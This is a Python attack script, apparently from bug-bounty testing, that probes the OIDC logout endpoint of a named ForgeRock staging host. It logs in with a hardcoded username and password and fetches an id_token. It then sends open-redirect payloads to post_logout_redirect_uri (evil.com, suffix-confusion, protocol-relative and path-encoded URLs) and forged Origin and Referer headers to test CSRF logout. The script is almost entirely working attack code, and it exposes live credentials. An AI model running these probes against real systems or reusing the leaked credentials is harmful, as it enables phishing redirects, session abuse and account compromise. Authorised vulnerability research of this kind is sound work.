# -*- coding: utf-8 -*-
"""AIC 第三十三轮:单点打透——endSession(OIDC RP-initiated logout)承诺验证
承诺(OIDC 规范):endSession 需要有效 id_token_hint 且 post_logout_redirect_uri
   必须匹配 client 注册的 redirect_uri;登出应校验会话归属。
反例组合:
  A. GET endSession?id_token_hint=<id_token> -> 302 登出(接受 GET + 无 Origin 校验 = CSRF logout 面)
  B. post_logout_redirect_uri=外域 -> 若 302 到外域 = open redirect
  C. post_logout_redirect_uri=同域非注册路径/变体 -> 白名单绕过
  D. Origin/Referer 外域对照 -> CSRF 防护是否缺失
预期结果表:
  成立(漏洞) -> B/C 任一 302 到攻击者可控 URL(open redirect),或 D 显示无任何来源校验
  不成立 -> post_logout_redirect_uri 严格白名单(仅注册 redirect 302),其余 400
"""
import requests, urllib3, json, base64, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok})
print('LOGIN OK')

# 拿 id_token(response_type=id_token 流,需要 nonce)
p = ('/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=id_token'
     '&redirect_uri=%s&scope=openid&state=t&nonce=n123' % quote(RU, safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
id_token = None
if 'id_token=' in loc:
    frag = loc.split('#')[1] if '#' in loc else ''
    id_token = frag.split('id_token=')[1].split('&')[0]
print('id_token:', (id_token or 'NONE')[:60])
if not id_token:
    print('Location:', loc[:200])
    raise SystemExit('no id_token')

# 解码看看
try:
    payload = json.loads(base64.urlsafe_b64decode(id_token.split('.')[1] + '=='))
    print('id_token payload:', json.dumps({k: payload.get(k) for k in ['sub', 'aud', 'iss', 'exp', 'nonce', 'sid']}, ensure_ascii=False))
except Exception as e:
    print('decode err', e)

def es(params='', label='', headers=None):
    try:
        r = S.get(BASE + '/am/oauth2/realms/alpha/connect/endSession' + params,
                  timeout=12, verify=False, allow_redirects=False, headers=headers or {})
        print('endSession[%-38s] -> %d %s' % (label, r.status_code,
              (r.headers.get('Location', '') or r.text[:90]).replace('\n', ' ')))
    except Exception as e:
        print('endSession[%-38s] -> ERR %s' % (label, str(e)[:60]))

print('\n=== A. 仅 id_token_hint(GET) ===')
es('?id_token_hint=' + id_token, '仅 hint')

print('\n=== B. post_logout_redirect_uri 白名单 ===')
for url, lab in [
    ('https://evil.com/', '外域'),
    ('https://evil.com/enduser/sessionCheck.html', '外域同路径'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/', '同域根'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/', '同域 enduser'),
    (RU, '注册 redirect(基线)'),
    (RU + '/', '注册+尾斜杠'),
    (RU + '?x=1', '注册+query'),
    ('https://openam-bug-bounty-stag.forgeblocks.com.evil.com/enduser/sessionCheck.html', '后缀混淆'),
    ('http://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html', 'http 降级'),
    ('//evil.com/', '协议相对'),
    ('https://evil.com/%2f..%2fenduser/sessionCheck.html', '路径编码混淆'),
]:
    es('?id_token_hint=' + id_token + '&post_logout_redirect_uri=' + quote(url, safe=''),
       lab, {'Origin': 'https://evil.com'})
    time.sleep(0.3)

print('\n=== C. 无会话 cookie(仅 id_token_hint) ===')
S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'Mozilla/5.0'})
try:
    r = S2.get(BASE + '/am/oauth2/realms/alpha/connect/endSession?id_token_hint=' + id_token,
               timeout=12, verify=False, allow_redirects=False)
    print('no-cookie endSession -> %d %s' % (r.status_code, (r.headers.get('Location', '') or r.text[:90]).replace('\n', ' ')))
except Exception as e:
    print('no-cookie endSession -> ERR %s' % str(e)[:60])

print('\n=== D. Origin/Referer 校验对照(带注册 redirect) ===')
for hd, lab in [
    ({'Origin': 'https://evil.com'}, 'evil Origin'),
    ({'Referer': 'https://evil.com/x.html'}, 'evil Referer'),
    ({}, '无来源头'),
]:
    es('?id_token_hint=' + id_token + '&post_logout_redirect_uri=' + quote(RU, safe=''),
       lab, hd)
    time.sleep(0.3)

print('\n=== E. POST 形态 ===')
r = S.post(BASE + '/am/oauth2/realms/alpha/connect/endSession',
           data={'id_token_hint': id_token, 'post_logout_redirect_uri': 'https://evil.com/'},
           headers=FORM, timeout=12, verify=False, allow_redirects=False)
print('POST endSession -> %d %s' % (r.status_code, (r.headers.get('Location', '') or r.text[:90]).replace('\n', ' ')))
